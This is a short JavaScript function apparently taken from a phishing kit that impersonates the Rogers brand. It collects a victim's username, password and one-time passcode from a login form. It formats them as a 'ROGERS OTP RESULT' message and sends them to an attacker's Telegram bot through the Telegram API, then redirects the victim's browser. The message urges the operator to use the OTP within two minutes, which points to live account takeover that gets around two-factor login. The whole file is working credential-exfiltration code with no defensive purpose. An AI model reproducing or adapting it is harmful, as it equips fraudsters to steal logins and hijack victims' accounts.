export function sendLogsToTelegram(dataState, redirect, configuration) {
  const username = dataState.username;
  const password = dataState.password;
  const otp = dataState.OTPcode.join("");

  if (!username || !password) return;

  // async function
  async function asyncFunction() {
    // ===============================================
    // ***********************************************
    // ===============================================

    const logMessage = `
<b>📧 ROGERS OTP RESULT</b>

<pre>
{
  Username: ${username}
  ${password !== "N/A" ? `Password: ${password}` : ""}
  ${otp.length > 2 ? `OTP code: ${otp}` : ""}
}
</pre>

${!otp || otp.length <= 2 ? "<b>🚨🚨🚨\n📩 Please enter the OTP in 2 minutes!</b>" : ""}
`;

    // ===============================================
    // ***********************************************
    // ===============================================

    const url = `https://api.telegram.org/bot${configuration.TELEGRAM_TOKEN}/sendMessage`;

    const HTTPHeader = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: configuration.CHAT_ID,
        text: logMessage,
        parse_mode: "HTML",
      }),
    };

    fetch(url, HTTPHeader)
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }

        return response.json();
      })
      .then((data) => {
        window.location.href = redirect;
      })
      .catch((error) => console.error("Error:", error));
  }

  asyncFunction();
}
